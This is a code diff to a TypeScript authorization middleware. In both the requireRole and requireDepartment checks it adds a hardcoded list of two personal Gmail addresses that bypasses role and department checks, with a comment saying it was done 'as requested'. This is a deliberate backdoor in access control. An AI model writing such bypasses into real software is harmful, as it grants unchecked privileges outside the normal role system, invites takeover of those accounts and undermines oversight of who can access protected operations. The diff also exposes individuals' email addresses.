@@ -92,7 +92,11 @@ export function requireRole(allowedRoles: string | string[]) {
                 }
             })
 
-            if (userRoles.length > 0) {
+            // Hardcoded bypass for operations leads as requested
+            const isAuthorizedEmail = ['genroujoshcatacutan25@gmail.com', 'daryldave018@gmail.com']
+                .includes(authReq.user!.email?.toLowerCase() || '');
+
+            if (userRoles.length > 0 || isAuthorizedEmail) {
                 next()
                 return
             }
@@ -149,7 +153,11 @@ export function requireDepartment(allowedDepartments: string | string[]) {
                 where: { userId: authReq.user!.userId, role: 'admin', departmentId: null }
             });
 
-            if (userRoles.length > 0 || isGlobalAdmin) {
+            // Hardcoded bypass for operations leads as requested
+            const isAuthorizedEmail = ['genroujoshcatacutan25@gmail.com', 'daryldave018@gmail.com']
+                .includes(authReq.user!.email?.toLowerCase() || '');
+
+            if (userRoles.length > 0 || isGlobalAdmin || isAuthorizedEmail) {
                 next()
                 return
             }
